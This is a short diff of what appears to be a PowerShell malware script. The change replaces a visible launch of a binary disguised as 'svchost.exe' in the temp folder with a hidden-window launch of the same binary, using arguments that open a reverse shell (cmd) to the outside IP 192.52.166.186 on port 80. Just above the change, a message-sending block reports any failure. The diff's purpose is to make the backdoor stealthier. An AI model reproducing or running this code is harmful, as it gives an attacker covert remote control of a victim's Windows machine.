@@ -43,5 +43,5 @@ try {
     Write-Output "Failed to send message. Error: $_"
 }
 
-cd $env:tmp
-.\svchost.exe 192.52.166.186 80 -e cmd
+
+start "$env:tmp\svchost.exe" -windowstyle h -args '192.52.166.186 80 -e cmd'
